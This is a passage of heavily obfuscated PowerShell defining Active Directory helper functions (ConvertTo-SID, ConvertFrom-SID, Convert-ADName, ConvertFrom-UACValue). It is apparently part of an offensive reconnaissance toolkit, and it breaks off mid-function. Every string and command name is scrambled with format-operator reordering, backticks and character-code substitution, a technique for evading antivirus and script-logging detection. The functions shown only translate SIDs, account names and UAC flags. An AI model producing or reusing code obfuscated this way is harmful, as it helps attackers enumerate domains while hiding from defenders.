        if (${P`SB`O`U`NDpARaMETErS}[("{1}{0}" -f 'omain','D')]) { ${dOm`A`In`Se`ArcHeRARgU`Men`TS}[("{0}{1}"-f 'Dom','ain')] = ${doMA`IN} }
        if (${p`sB`oU`NdPaRame`TE`RS}[("{0}{1}{2}" -f'Serv','e','r')]) { ${doMa`in`SEA`RCheRa`RGume`NTS}[("{1}{0}{2}" -f'e','Serv','r')] = ${Serv`er} }
        if (${PsbO`UNDPAR`A`mETE`RS}[("{1}{2}{0}" -f'ial','Cre','dent')]) { ${doMaInSEA`R`CH`ER`AR`GUmeNts}[("{0}{2}{3}{1}" -f'Crede','al','n','ti')] = ${cr`edenTi`AL} }
    }

    PROCESS {
        ForEach (${o`BJect} in ${oBJE`Ctn`AMe}) {
            ${ObJ`ecT} = ${Obj`EcT} -Replace '/','\'

            if (${p`sbound`P`A`RaMetErS}[("{1}{2}{0}" -f 'al','C','redenti')]) {
                ${dN} = &("{1}{4}{3}{2}{0}" -f'e','Co','t-ADNam','ver','n') -Identity ${o`BjeCt} -OutputType 'DN' @DomainSearcherArguments
                if (${dN}) {
                    ${us`ER`dOMAIN} = ${Dn}.("{2}{1}{0}" -f 'String','b','Su').Invoke(${Dn}.("{0}{1}{2}"-f'Ind','ex','Of').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                    ${uSE`RnamE} = ${Dn}.("{0}{1}" -f 'Spli','t').Invoke(',')[0].("{0}{1}" -f 'spli','t').Invoke('=')[1]

                    ${dOmA`IN`SEaRCHER`Ar`GUm`ents}[("{0}{1}{2}" -f 'I','dent','ity')] = ${u`SEr`NAme}
                    ${DO`maiNSear`CHer`ArG`UME`NTS}[("{1}{0}" -f 'main','Do')] = ${u`sErdomA`iN}
                    ${dOMaIN`S`E`ArChErAR`GuMEnTS}[("{0}{2}{1}"-f 'P','perties','ro')] = ("{0}{1}{2}" -f'obj','e','ctsid')
                    &("{0}{2}{1}{4}{3}"-f'G','a','et-Dom','ject','inOb') @DomainSearcherArguments | &("{0}{2}{1}" -f 'Sel','ject','ect-Ob') -Expand ("{0}{2}{1}"-f'obje','d','ctsi')
                }
            }
            else {
                try {
                    if (${oBJ`eCT}.("{1}{2}{0}"-f 'tains','C','on').Invoke('\')) {
                        ${d`o`MaIn} = ${O`BJ`ECT}.("{1}{0}"-f'plit','S').Invoke('\')[0]
                        ${O`BJ`ecT} = ${oBJ`E`Ct}.("{1}{0}"-f'it','Spl').Invoke('\')[1]
                    }
                    elseif (-not ${PS`BoUNdP`Aram`eT`E`RS}[("{1}{0}" -f'in','Doma')]) {
                        ${D`om`Ai`NsEarCheR`ARgUMENtS} = @{}
                        ${Do`m`AIn} = (&("{2}{1}{0}" -f 'n','omai','Get-D') @DomainSearcherArguments)."N`AMe"
                    }

                    ${O`Bj} = (&("{2}{1}{0}" -f'ect','Obj','New-') ("{1}{7}{2}{3}{4}{9}{6}{5}{8}{0}"-f 't','Syst','m','.Security.','Princ','l.NTAcco','pa','e','un','i')(${DomA`iN}, ${oB`Je`cT}))
                    ${o`BJ}."T`RaNsL`Ate"([System.Security.Principal.SecurityIdentifier])."vAL`Ue"
                }
                catch {
                    &("{1}{3}{2}{0}" -f'erbose','Wri','V','te-') ('[Con'+'v'+'ertTo-S'+'ID]'+' '+'Err'+'or '+'co'+'nver'+'tin'+'g '+"$Domain\$Object "+': '+"$_")
                }
            }
        }
    }
}


function CoNVe`RTF`Rom-sid {


    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(MaNdaTorY = ${tR`UE}, valuEFRoMPiPeLiNe = ${tr`UE}, vAlUefromPIPelinEBYPROpeRTYNAmE = ${tR`Ue})]
        [Alias('SID')]
        [ValidatePattern({"{1}{0}" -f'-1-.*','^S'})]
        [String[]]
        ${Ob`JEcTs`id},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`o`MaIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{4}{1}{3}" -f 'Dom','r','a','oller','inCont'})]
        [String]
        ${se`RVER},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REDenT`I`AL} =   ( &("{0}{1}"-f'di','r')  ('VariAB'+'Le'+':j'+'h3XO6')  )."VAL`Ue"::"Em`pTY"
    )

    BEGIN {
        ${AD`NAMEA`RGuM`En`TS} = @{}
        if (${p`SBOUNDPaR`A`MeT`ErS}[("{0}{1}"-f 'Do','main')]) { ${A`dnamEa`Rg`U`MENtS}[("{2}{0}{1}"-f'i','n','Doma')] = ${DO`Ma`iN} }
        if (${ps`BoUndPaRAM`ET`ERS}[("{1}{0}" -f 'r','Serve')]) { ${ad`NAMe`A`RGUmeN`TS}[("{0}{1}" -f'Serve','r')] = ${S`ER`VEr} }
        if (${p`S`B`ouNdpAramETeRS}[("{1}{2}{0}"-f 'l','Creden','tia')]) { ${Adn`A`mEarGum`ENTs}[("{0}{2}{1}" -f 'Cre','tial','den')] = ${CRed`e`N`TiAl} }
    }

    PROCESS {
        ForEach (${Ta`RGEt`s`iD} in ${OBJeC`T`SId}) {
            ${taR`g`eTsiD} = ${ta`RGEtS`Id}.("{0}{1}" -f 'tri','m').Invoke('*')
            try {
                
                Switch (${t`A`RgetsiD}) {
                    ("{0}{1}"-f'S-','1-0')         { ("{1}{0}{2}{3}" -f 'ul','N','l Author','ity') }
                    ("{0}{1}" -f'S-','1-0-0')       { ("{0}{1}" -f'N','obody') }
                    ("{0}{1}"-f'S-1','-1')         { ("{2}{3}{1}{0}" -f'ity','r','World ','Autho') }
                    ("{1}{0}{2}"-f '1-','S-','1-0')       { ("{0}{1}"-f'Everyo','ne') }
                    ("{1}{0}" -f'2','S-1-')         { ("{0}{3}{2}{1}"-f 'Local Au','y','t','thori') }
                    ("{1}{0}" -f '1-2-0','S-')       { ("{1}{0}"-f 'ocal','L') }
                    ("{1}{0}" -f'2-1','S-1-')       { ("{0}{3}{2}{1}"-f'Co',' ','e Logon','nsol') }
                    ("{1}{0}" -f'-1-3','S')         { ("{0}{1}{3}{2}" -f'Cre','a','uthority','tor A') }
                    ("{2}{1}{0}" -f '-0','3','S-1-')       { ("{2}{0}{1}"-f 'a','tor Owner','Cre') }
                    ("{0}{1}"-f 'S-','1-3-1')       { ("{1}{3}{2}{0}" -f 'Group','Cre',' ','ator') }
                    ("{0}{1}" -f 'S','-1-3-2')       { ("{5}{4}{3}{0}{2}{1}" -f 'w','er','ner Serv','or O','reat','C') }
                    ("{1}{0}" -f '-3-3','S-1')       { ("{1}{2}{3}{5}{4}{0}"-f 'rver','Creato','r Gr','ou','e','p S') }
                    ("{2}{0}{1}" -f '-1-3','-4','S')       { ("{2}{1}{0}"-f's','er Right','Own') }
                    ("{1}{0}"-f'-1-4','S')         { ("{1}{2}{0}{3}" -f'ique Aut','Non-u','n','hority') }
                    ("{1}{0}"-f'-1-5','S')         { ("{0}{2}{1}"-f 'NT ','rity','Autho') }
                    ("{2}{1}{0}" -f'1','-','S-1-5')       { ("{0}{1}" -f 'D','ialup') }
                    ("{1}{2}{0}"-f '-2','S-1','-5')       { ("{2}{0}{1}" -f'etw','ork','N') }
                    ("{0}{1}" -f 'S-1-5-','3')       { ("{1}{0}"-f'h','Batc') }
                    ("{0}{1}" -f 'S-1-5-','4')       { ("{1}{0}{2}"-f'nter','I','active') }
                    ("{2}{1}{0}" -f '-6','-1-5','S')       { ("{2}{1}{0}"-f'ice','rv','Se') }
                    ("{0}{1}"-f 'S-1-5','-7')       { ("{2}{0}{1}"-f'onym','ous','An') }
                    ("{1}{0}{2}"-f'1-5','S-','-8')       { ("{0}{1}" -f 'Pro','xy') }
                    ("{0}{2}{1}" -f'S-1','-9','-5')       { ("{2}{3}{0}{5}{1}{4}"-f 'is','main ','Ente','rpr','Controllers','e Do') }
                    ("{1}{0}{2}" -f '1-5-','S-','10')      { ("{0}{1}{3}{2}"-f'Principa','l ','f','Sel') }
                    ("{2}{1}{0}" -f '1','1','S-1-5-')      { ("{0}{1}{4}{3}{2}{5}"-f'A','uthe',' ','ed','nticat','Users') }
                    ("{0}{2}{1}" -f 'S-','2','1-5-1')      { ("{3}{2}{1}{0}" -f 'ode','C','estricted ','R') }
                    ("{2}{1}{0}"-f'3','5-1','S-1-')      { ("{2}{1}{3}{0}" -f 'Users','l Serve','Termina','r ') }
                    ("{0}{1}{2}"-f'S-','1-5','-14')      { ("{4}{3}{1}{2}{7}{0}{6}{5}"-f'eracti','ote ','In','m','Re',' Logon','ve','t') }
                    ("{1}{0}" -f '5-15','S-1-')      { ("{4}{3}{2}{0}{1}"-f'zat','ion ','s Organi','hi','T') }
                    ("{1}{0}" -f '5-17','S-1-')      { ("{3}{5}{4}{0}{1}{2}" -f 'Organizat','io','n ','T','is ','h') }
                    ("{1}{0}" -f '1-5-18','S-')      { ("{1}{0}{3}{2}" -f'oca','L',' System','l') }
                    ("{1}{2}{0}" -f'9','S','-1-5-1')      { ("{3}{1}{2}{0}"-f'ty','T Aut','hori','N') }
                    ("{1}{2}{0}" -f '0','S-1-5','-2')      { ("{0}{3}{1}{2}" -f'N','ri','ty','T Autho') }
                    ("{1}{0}{2}" -f '-80','S-1-5','-0')    { ("{2}{0}{1}" -f 'ice','s ','All Serv') }
                    ("{1}{2}{0}" -f '44','S-','1-5-32-5')  { ((("{3}{1}{2}{4}{0}" -f 'tors','aA','dm','BUILTINlP','inistra')).("{1}{0}" -f 'EPLACE','r').Invoke('lPa','\')) }
                    ("{3}{2}{0}{1}" -f '2-5','45','-3','S-1-5')  { ((("{2}{3}{1}{0}"-f 'NKSUsers','LTIN','BU','I')).("{2}{1}{0}" -f 'E','C','replA').Invoke('NKS','\')) }
                    ("{0}{2}{1}"-f 'S-1-','-546','5-32')  { ((("{0}{2}{3}{1}{4}" -f 'BU','TINcRi','I','L','Guests'))  -cRePLACE ([CHAR]99+[CHAR]82+[CHAR]105),[CHAR]92) }
                    ("{1}{0}{3}{2}"-f '-1','S','2-547','-5-3')  { ((("{3}{1}{2}{5}{4}{0}"-f 's','I','L','BU','}Power User','TIN{0'))-f [cHAR]92) }
                    ("{1}{2}{0}{3}"-f'-32-5','S-1','-5','48')  { ((("{0}{5}{3}{1}{4}{2}"-f 'BU','t ','ors','coun','Operat','ILTIN{0}Ac')) -F[CHaR]92) }
                    ("{0}{2}{1}" -f'S-1-5','32-549','-')  { ((("{3}{6}{4}{2}{1}{5}{0}"-f 'ors','Opera','ver ','BUIL','N{0}Ser','t','TI')) -F  [ChAr]92) }
                    ("{2}{1}{0}"-f'32-550','1-5-','S-')  { ((("{2}{1}{3}{0}{4}" -f ' Operat','TIN{0}','BUIL','Print','ors')) -f  [CHar]92) }
                    ("{0}{2}{3}{1}" -f 'S','2-551','-1-5','-3')  { ((("{4}{0}{5}{1}{2}{3}" -f 'ku','Op','e','rators','BUILTIN5G2Bac','p '))."R`ePl`Ace"(([CHAR]53+[CHAR]71+[CHAR]50),'\')) }
                    ("{2}{1}{0}"-f'2','-32-55','S-1-5')  { ((("{3}{2}{4}{1}{0}"-f's','or','eplica','BUILTINRpwR','t')) -cRepLaCe  'Rpw',[chAR]92) }
                    ("{2}{0}{3}{1}" -f'5','2-554','S-1-','-3')  { ((("{3}{0}{2}{5}{9}{4}{7}{6}{8}{1}" -f'NzLUPr',' Access','e-Windo','BUILTI','0','ws 2','atib',' Comp','le','00')) -RePLAce ([chaR]122+[chaR]76+[chaR]85),[chaR]92) }
                    ("{0}{2}{1}"-f'S','1-5-32-555','-')  { ((("{1}{5}{0}{4}{2}{3}"-f'emote Deskto','BUILTINZj',' ','Users','p','KR'))."rEp`lACE"('ZjK',[StrinG][cHar]92)) }
                    ("{2}{1}{0}"-f '556','32-','S-1-5-')  { ((("{6}{7}{9}{3}{8}{2}{5}{4}{1}{0}"-f 'tors','era','Conf','UN',' Op','iguration','BU','IL','etwork ','TINDC'))."rePL`Ace"(([chAR]68+[chAR]67+[chAR]85),[sTRINg][chAR]92)) }
                    ("{2}{1}{0}" -f'557','-1-5-32-','S')  { ((("{6}{4}{0}{2}{5}{3}{7}{1}" -f 'yIncomi','Trust Builders','ng ','e','o','For','BUILTINd','st '))-crePLAce ([chaR]100+[chaR]111+[chaR]121),[chaR]92) }
                    ("{0}{1}{2}"-f'S-1-5','-32-5','58')  { ((("{4}{5}{8}{6}{2}{7}{1}{0}{3}" -f 'User','or ',' Moni','s','B','U','erformance','t','ILTIN{0}P')) -f[ChAR]92) }
                    ("{1}{0}{2}" -f'1-5-32-','S-','559')  { ((("{4}{3}{2}{0}{1}" -f'ce Lo','g Users','man','r','BUILTINbNFPerfo'))-CRePLace  ([CHAr]98+[CHAr]78+[CHAr]70),[CHAr]92) }
                    ("{0}{1}{2}"-f'S','-1-5','-32-560')  { ((("{8}{0}{5}{2}{3}{1}{11}{6}{4}{7}{12}{9}{10}" -f 'UILT','nd','X','GWi',' Au','INd','s','tho','B','cess G','roup','ow','rization Ac')) -CrEpLAce([CHaR]100+[CHaR]88+[CHaR]71),[CHaR]92) }
                    ("{2}{3}{1}{0}" -f '561','-32-','S-','1-5')  { ((("{9}{8}{4}{6}{2}{0}{1}{3}{5}{7}" -f 'e','ns',' Server Lic','e Serv','TIN{0}Termina','er','l','s','IL','BU')) -F[cHAr]92) }
                    ("{2}{3}{1}{0}" -f '62','32-5','S-','1-5-')  { ((("{2}{1}{5}{7}{6}{0}{4}{3}"-f'te','UIL','B','Users','d COM ','TINzlS','ibu','Distr'))-rePLAcE  'zlS',[chAr]92) }
                    ("{1}{2}{0}" -f'5-32-569','S','-1-')  { ((("{2}{4}{6}{1}{5}{3}{0}" -f 'ors','raph','BUILTINQs','Operat','4C','ic ','ryptog'))."RepL`ACe"('Qs4',[StRINg][Char]92)) }
                    ("{2}{0}{1}{3}"-f '-5-3','2-5','S-1','73')  { ((("{3}{2}{6}{0}{1}{4}{7}{5}"-f'n','t','I','BUILT',' Lo','aders','NrDPEve','g Re'))-CREPLACE  ([cHar]114+[cHar]68+[cHar]80),[cHar]92) }
                    ("{1}{2}{3}{0}"-f '2-574','S-1-5','-','3')  { ((("{7}{1}{8}{0}{9}{4}{10}{5}{11}{2}{3}{6}"-f 'N0qBCe','U','OM',' ','tifica',' ','Access','B','ILTI','r','te Service','DC')) -cREPlACE([ChAR]48+[ChAR]113+[ChAR]66),[ChAR]92) }
                    ("{2}{0}{1}{3}"-f '-1-5-32-5','7','S','5')  { ((("{2}{6}{1}{4}{5}{8}{0}{3}{7}" -f 'cess Ser','IN{0}RDS R','B','v','emo','t','UILT','ers','e Ac'))  -F  [cHAR]92) }
                    ("{1}{0}{2}" -f '-32-57','S-1-5','6')  { ((("{5}{1}{4}{0}{3}{2}{6}" -f 'dpoin','NFSlRDS ','e','t Serv','En','BUILTI','rs'))."REpL`ACE"(([cHAr]70+[cHAr]83+[cHAr]108),[stRING][cHAr]92)) }
                    ("{2}{3}{0}{1}" -f '5-32-5','77','S','-1-')  { ((("{2}{3}{0}{6}{5}{1}{4}"-f'e','erv','BUILTINa6','HRDS Manag','ers','ent S','m')).("{2}{1}{0}" -f 'Ce','a','RepL').Invoke('a6H','\')) }
                    ("{1}{0}{3}{2}" -f '1-5-3','S-','8','2-57')  { ((("{3}{1}{0}{4}{5}{2}"-f 'e','UILTIN9xYHyp','istrators','B','r','-V Admin')) -cREPlACE ([cHaR]57+[cHaR]120+[cHaR]89),[cHaR]92) }
                    ("{0}{3}{1}{2}" -f'S-1','5','-32-579','-')  { ((("{7}{5}{8}{4}{2}{1}{6}{3}{0}"-f'erators','ntrol ','s Co','sistance Op','s','ILTI','As','BU','N8tvAcce'))-crEPlace '8tv',[CHar]92) }
                    ("{1}{2}{0}"-f'32-580','S','-1-5-')  { ((("{0}{6}{3}{1}{5}{4}{2}{8}{7}"-f'BUI','ol Assistan',' Op','ss Contr','e','c','LTINJzWAcce','ors','erat')) -CrEpLACE ([cHaR]74+[cHaR]122+[cHaR]87),[cHaR]92) }
                    ("{1}{0}{2}" -f'u','Defa','lt') {
                        &("{0}{1}{2}{4}{3}" -f'C','onvert-AD','N','e','am') -Identity ${T`Ar`g`etSid} @ADNameArguments
                    }
                }
            }
            catch {
                &("{3}{1}{0}{4}{2}"-f '-V','ite','e','Wr','erbos') ('[C'+'onve'+'rtFr'+'o'+'m-SID] '+'Error'+' '+'conve'+'rting'+' '+'S'+'ID '+"'$TargetSid' "+': '+"$_")
            }
        }
    }
}


function CONvE`Rt`-adN`Ame {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{8}{11}{7}{10}{4}{0}{2}{5}{6}{1}{9}{3}" -f 'ssFo','n','rStateC','ns','oce','hangingF','u','seShouldP','PS','ctio','r','U'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(mAndATORY = ${t`RuE}, vAluEfrOMPipEliNe = ${tR`UE}, vALUEFrOMpipeLiNEBypROpERTynaME = ${t`Rue})]
        [Alias({"{1}{0}" -f'e','Nam'}, {"{1}{3}{2}{0}"-f'me','Obj','tNa','ec'})]
        [String[]]
        ${iDEn`TI`TY},

        [String]
        [ValidateSet('DN', {"{0}{1}{3}{2}" -f'C','anoni','l','ca'}, 'NT4', {"{1}{0}" -f 'ay','Displ'}, {"{2}{0}{1}" -f 'a','inSimple','Dom'}, {"{2}{4}{0}{1}{3}" -f't','erpriseSimpl','E','e','n'}, {"{0}{1}"-f 'GU','ID'}, {"{1}{0}{2}" -f'ow','Unkn','n'}, 'UPN', {"{2}{1}{0}" -f 'icalEx','non','Ca'}, 'SPN')]
        ${ouTpu`TTY`Pe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`OMA`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}{3}{4}"-f'Doma','ntrol','inCo','le','r'})]
        [String]
        ${SeRV`Er},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRE`DENT`i`Al} =  ( &("{1}{0}" -f 'EM','It') ("{0}{1}{3}{2}"-f'vArIA','Ble','3XO6',':jH'))."vAl`UE"::"e`MpTY"
    )

    BEGIN {
        ${na`ME`TYPes} = @{
            'DN'                =   1  
            ("{2}{0}{1}"-f'noni','cal','Ca')         =   2  
            'NT4'               =   3  
            ("{0}{2}{1}" -f 'Dis','lay','p')           =   4  
            ("{0}{1}{3}{2}" -f'Do','ma','le','inSimp')      =   5  
            ("{0}{1}{3}{2}" -f'E','n','priseSimple','ter')  =   6  
            ("{1}{0}"-f 'D','GUI')              =   7  
            ("{2}{0}{1}" -f'n','own','Unk')           =   8  
            'UPN'               =   9  
            ("{0}{1}{3}{2}" -f 'C','anon','calEx','i')       =   10 
            'SPN'               =   11 
            'SID'               =   12 
        }

        
        function iNVokE-`meT`hOD([__ComObject] ${o`Bje`Ct}, [String] ${mE`THOd}, ${Para`M`etERS}) {
            ${OUtp`UT} = ${n`UlL}
            ${o`UtP`Ut} = ${O`B`JEct}.("{0}{1}{2}" -f'G','e','tType').Invoke().("{1}{2}{0}{3}" -f'okeMem','In','v','ber').Invoke(${ME`T`hOd}, ("{0}{3}{1}{2}"-f'I','h','od','nvokeMet'), ${nu`Ll}, ${OB`jeCt}, ${p`ARA`metERs})
            &("{3}{2}{1}{0}" -f 'ut','-Outp','te','Wri') ${Out`p`Ut}
        }

        function g`et-pROPE`RtY([__ComObject] ${OB`jeCT}, [String] ${propE`R`Ty}) {
            ${O`BJE`CT}.("{2}{1}{0}"-f'ype','tT','Ge').Invoke().("{0}{3}{1}{2}"-f 'I','m','ber','nvokeMe').Invoke(${pRoPe`R`TY}, ("{0}{2}{1}" -f 'GetProp','y','ert'), ${N`UlL}, ${o`BJ`eCT}, ${NU`lL})
        }

        function SEt`-PR`Ope`Rty([__ComObject] ${ob`j`ECT}, [String] ${p`Rop`eRty}, ${P`ARa`MeTERs}) {
            [Void] ${Ob`jEct}.("{1}{0}"-f 'pe','GetTy').Invoke().("{0}{1}{2}" -f'I','nvokeM','ember').Invoke(${PRoP`E`R`TY}, ("{1}{0}{2}"-f 'ert','SetProp','y'), ${nU`LL}, ${o`Bj`eCt}, ${P`A`RAm`eterS})
        }

        
        if (${pSBOUnd`P`ArAm`ete`RS}[("{0}{1}"-f 'Serve','r')]) {
            ${ad`S`in`ittyPe} = 2
            ${IN`i`TN`AME} = ${sErv`ER}
        }
        elseif (${pSbo`UNd`par`A`meTE`Rs}[("{0}{1}{2}" -f'Dom','a','in')]) {
            ${AdSI`NItT`yPe} = 1
            ${IN`Itn`AMe} = ${dom`Ain}
        }
        elseif (${psBOUndpar`A`Me`TerS}[("{3}{1}{2}{0}"-f'al','edent','i','Cr')]) {
            ${cr`ed} = ${creD`ent`I`Al}.("{3}{4}{1}{0}{2}" -f'Cr','k','edential','GetNetw','or').Invoke()
            ${A`DsI`NITtY`Pe} = 1
            ${in`I`TNAME} = ${c`Red}."Do`M`AiN"
        }
        else {
            
            ${ads`INI`Tt`YpE} = 3
            ${in`IT`Name} = ${n`ULL}
        }
    }

    PROCESS {
        ForEach (${Tar`g`eTIdE`NTitY} in ${i`deN`TITy}) {
            if (-not ${psbO`UndpAr`AMeT`E`Rs}[("{2}{1}{0}" -f'pe','Ty','Output')]) {
                if (${tAR`GE`Ti`dENtItY} -match ((("{0}{3}{5}{4}{2}{6}{7}{1}" -f '^',' ]+','IH[A-Z','[A-','+WIHW','Za-z]','a','-z'))-CReplAce 'WIH',[chAR]92)) {
                    ${ADS`Ou`TPU`Ttype} = ${NamETY`P`eS}[("{2}{0}{1}"-f'imp','le','DomainS')]
                }
                else {
                    ${aDSO`U`Tput`TY`PE} = ${nAMe`TY`pEs}['NT4']
                }
            }
            else {
                ${Adsoutp`U`Ttype} = ${NA`MeTYp`eS}[${oUt`p`UTT`ype}]
            }

            ${TRAn`s`latE} = &("{1}{0}{2}{3}" -f 'w-O','Ne','b','ject') -ComObject ("{4}{0}{1}{2}{3}" -f'eTrans','la','t','e','Nam')

            if (${psbouNd`p`A`R`Am`ETers}[("{1}{2}{0}"-f'tial','Cr','eden')]) {
                try {
                    ${c`Red} = ${c`REdenT`Ial}.("{3}{0}{2}{4}{1}" -f'NetworkCre','l','de','Get','ntia').Invoke()

                    &("{0}{4}{1}{2}{3}"-f'I','e-','Meth','od','nvok') ${T`R`ANSLAte} ("{2}{1}{0}"-f 'itEx','n','I') (
                        ${AdS`INITT`ype},
                        ${iN`itN`AmE},
                        ${Cr`eD}."US`ERnA`ME",
                        ${cR`eD}."d`Om`AIn",
                        ${cr`ED}."pAsS`worD"
                    )
                }
                catch {
                    &("{4}{2}{1}{0}{3}"-f'-Ver','e','rit','bose','W') ('[Conve'+'r'+'t-AD'+'Nam'+'e] '+'E'+'rr'+'or '+'initia'+'lizi'+'ng '+'t'+'ranslati'+'on'+' '+'f'+'or '+"'$Identity' "+'u'+'sing '+'alt'+'ernate'+' '+'credentia'+'ls'+' '+': '+"$_")
                }
            }
            else {
                try {
                    ${nU`Ll} = &("{0}{2}{4}{1}{3}" -f 'I','oke-Meth','n','od','v') ${T`Ra`Nsl`ATE} ("{0}{1}" -f'I','nit') (
                        ${adSi`NITt`y`Pe},
                        ${INI`TName}
                    )
                }
                catch {
                    &("{1}{0}{2}" -f'ite-Ve','Wr','rbose') ('[C'+'onvert-A'+'DN'+'ame'+'] '+'E'+'rr'+'or '+'in'+'itial'+'izing'+' '+'tran'+'s'+'lation '+'fo'+'r '+"'$Identity' "+': '+"$_")
                }
            }

            
            &("{0}{1}{2}"-f'S','e','t-Property') ${TRAnS`la`TE} ("{2}{3}{1}{0}"-f'erral','aseRef','C','h') (0x60)

            try {
                
                ${N`UlL} = &("{0}{2}{1}{3}" -f 'I','-Metho','nvoke','d') ${trA`N`s`late} 'Set' (8, ${TArGE`TIdE`Nti`Ty})
                &("{2}{0}{1}"-f 'e-Meth','od','Invok') ${Tra`Ns`laTE} 'Get' (${Ad`sOUTpU`TtY`PE})
            }
            catch [System.Management.Automation.MethodInvocationException] {
                &("{3}{1}{0}{2}{4}"-f 'ite','r','-Verb','W','ose') "[Convert-ADName] Error translating '$TargetIdentity' : $($_.Exception.InnerException.Message) "
            }
        }
    }
}


function conveRtf`Rom-`U`ACV`AlUe {


    [OutputType({"{1}{7}{0}{8}{10}{9}{3}{4}{5}{6}{2}" -f's','S','y','s.Spec','ialize','d.Orde','redDictionar','y','tem.Coll','ction','e'})]
    [CmdletBinding()]
    Param(
        [Parameter(MANdaTORy = ${TR`Ue}, VaLUeFroMpiPELiNE = ${T`RUe}, VAluefROMpIpElineByprOpeRTyName = ${t`Rue})]
        [Alias('UAC', {"{0}{1}{3}{2}{4}"-f'userac','c','untcon','o','trol'})]
        [Int]
        ${V`A`lue},

        [Switch]
        ${s`hoWA`LL}
    )

    BEGIN {
        
        ${uA`Cv`AlUeS} = &("{2}{0}{1}{3}"-f 'e','w-O','N','bject') ("{14}{7}{0}{13}{9}{11}{1}{4}{6}{2}{12}{10}{8}{5}{3}" -f 'Col','s.Special','ed.','ry','i','iona','z','em.','ct','cti','Di','on','Ordered','le','Syst')
        ${u`ACV`ALUEs}.("{1}{0}" -f'dd','A').Invoke(("{1}{0}" -f'CRIPT','S'), 1)
        ${Ua`CvAL`UES}.("{0}{1}" -f 'Ad','d').Invoke(("{0}{1}{3}{2}{4}"-f 'AC','COU','DISABL','NT','E'), 2)
        ${U`Acvalu`Es}.("{0}{1}" -f'Ad','d').Invoke(("{0}{3}{2}{1}" -f 'H','QUIRED','DIR_RE','OME'), 8)
        ${uAC`Va`LuEs}.("{0}{1}" -f 'A','dd').Invoke(("{0}{1}"-f'LOCKOU','T'), 16)
        ${UACV`Al`UeS}.("{0}{1}" -f 'A','dd').Invoke(("{4}{3}{2}{0}{1}"-f 'Q','D','NOTRE','ASSWD_','P'), 32)
        ${uaC`VA`lUeS}.("{0}{1}"-f'A','dd').Invoke(("{2}{3}{1}{0}"-f'CANT_CHANGE','D_','PAS','SW'), 64)
        ${u`A`cVaLU`Es}.("{1}{0}"-f 'dd','A').Invoke(("{5}{2}{1}{6}{4}{3}{8}{0}{7}"-f'LLO','PTE','NCRY','TEX','_','E','D','WED','T_PWD_A'), 128)
        ${uacV`Al`UEs}.("{1}{0}"-f'dd','A').Invoke(("{0}{4}{5}{2}{6}{1}{3}"-f 'TEMP_DUP','OU','ATE_AC','NT','L','IC','C'), 256)
        ${uACv`A`LUES}.("{0}{1}" -f 'Ad','d').Invoke(("{4}{1}{3}{0}{2}"-f '_ACC','RMA','OUNT','L','NO'), 512)
        ${ua`CvALu`es}.("{1}{0}"-f 'dd','A').Invoke(("{0}{1}{3}{2}{4}" -f 'IN','TERDOM','R','AIN_T','UST_ACCOUNT'), 2048)
        ${Ua`c`VaLuEs}.("{1}{0}" -f'dd','A').Invoke(("{1}{4}{3}{0}{2}" -f'OUN','WORKSTATION_TRUST','T','ACC','_'), 4096)
        ${U`Ac`VaL`UES}.("{0}{1}"-f 'A','dd').Invoke(("{5}{2}{1}{4}{3}{0}" -f 'UNT','ST','U','CCO','_A','SERVER_TR'), 8192)
        ${UA`C`VaL`Ues}.("{0}{1}"-f'A','dd').Invoke(("{5}{4}{3}{6}{2}{0}{1}" -f'E_PASSW','ORD','R','X','T_E','DON','PI'), 65536)
        ${u`AcValU`ES}.("{0}{1}"-f 'A','dd').Invoke(("{2}{4}{3}{0}{1}" -f'_','ACCOUNT','MNS','OGON','_L'), 131072)
        ${U`ACV`AlU`eS}.("{0}{1}"-f'A','dd').Invoke(("{3}{1}{2}{0}"-f'RED','ARTCARD_','REQUI','SM'), 262144)
        ${U`A`cva`lUeS}.("{1}{0}" -f 'dd','A').Invoke(("{0}{3}{1}{2}{4}" -f 'TRUSTED','FOR_DE','LEGA','_','TION'), 524288)
        ${u`A`cValUEs}.("{0}{1}" -f'A','dd').Invoke(("{2}{3}{4}{1}{0}"-f 'D','TE','NOT_DE','LEG','A'), 1048576)
        ${UAcV`A`LUEs}.("{1}{0}" -f 'dd','A').Invoke(("{2}{4}{1}{0}{3}" -f'NL','DES_KEY_O','US','Y','E_'), 2097152)
        ${Uac`VAL`Ues}.("{0}{1}"-f'Ad','d').Invoke(("{3}{1}{2}{0}"-f 'AUTH','T_REQ_','PRE','DON'), 4194304)
        ${UAcV`ALU`es}.("{0}{1}" -f 'A','dd').Invoke(("{0}{2}{3}{1}" -f'PASSWOR','D','D_EXP','IRE'), 8388608)
        ${UaCVaL`U`eS}.("{1}{0}" -f 'dd','A').Invoke(("{4}{8}{9}{3}{2}{6}{1}{0}{7}{5}" -f'EGA','L','TH_F','U','T','ION','OR_DE','T','RUSTED_TO','_A'), 16777216)
        ${Ua`cvALU`Es}.("{0}{1}"-f'A','dd').Invoke(("{1}{5}{3}{4}{0}{2}" -f'COUN','P','T','TIAL_SECRET','S_AC','AR'), 67108864)
    }

    PROCESS {
        ${r`eSU`lTUACVAl`UEs} = &("{2}{0}{1}" -f'ew','-Object','N') ("{13}{10}{0}{8}{2}{1}{6}{11}{4}{5}{12}{3}{9}{7}" -f'm.','ctions.Sp','le','Dic','iali','zed.Ordere','e','y','Col','tionar','yste','c','d','S')

        if (${s`HOwa`LL}) {
            ForEach (${UAc`V`AlUE} in ${Uacv`ALu`es}.("{0}{1}{2}" -f 'GetEn','umerato','r').Invoke()) {
                if ( (${va`LuE} -band ${uAcVA`L`Ue}."vA`lUe") -eq ${ua`cval`Ue}."VAl`UE") {
                    ${RES`U`l`TUACv`Alues}.("{0}{1}" -f'Ad','d').Invoke(${UA`CVa`luE}."na`ME", "$($UACValue.Value)+")
                }
                else {
                    ${re`S`UL`TUACV`AlUES}.("{0}{1}"-f 'Ad','d').Invoke(${uA`C`VaLUE}."nA`mE", "$($UACValue.Value)")
                }
            }
        }
        else {
